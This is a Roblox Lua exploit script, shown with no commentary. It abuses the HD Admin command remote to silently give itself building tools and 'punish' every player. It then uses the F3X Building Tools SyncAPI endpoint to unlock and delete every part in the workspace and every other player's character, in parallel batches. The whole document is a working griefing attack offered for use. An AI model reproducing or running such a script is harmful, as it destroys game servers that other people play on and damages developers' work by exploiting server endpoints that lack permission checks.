game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent:InvokeServer(";btools me , ;punish all")
task.wait(0.4)
local P, W = game:GetService("Players"), game:GetService("Workspace")
local lp = P.LocalPlayer
local tool = lp.Backpack:FindFirstChild("Building Tools") or (lp.Character and lp.Character:FindFirstChild("Building Tools")) or lp.Backpack:FindFirstChildOfClass("Tool") or (lp.Character and lp.Character:FindFirstChildOfClass("Tool"))
if not tool or not tool:FindFirstChild("SyncAPI") then return end
local r, t = tool.SyncAPI.ServerEndpoint, {}
for _, v in ipairs(W:GetDescendants()) do if v:IsA("BasePart") and not v:IsA("Terrain") and v ~= tool and (not lp.Character or not v:IsDescendantOf(lp.Character)) then table.insert(t, v) end end
for _, p in ipairs(P:GetPlayers()) do if p ~= lp and p.Character then table.insert(t, p.Character) end end
for i = 1, #t, 278 do local b = {unpack(t, i, math.min(i + 278, #t))} task.spawn(function() pcall(function() r:InvokeServer("SetLocked", b, false) r:InvokeServer("Remove", b) end) end) end
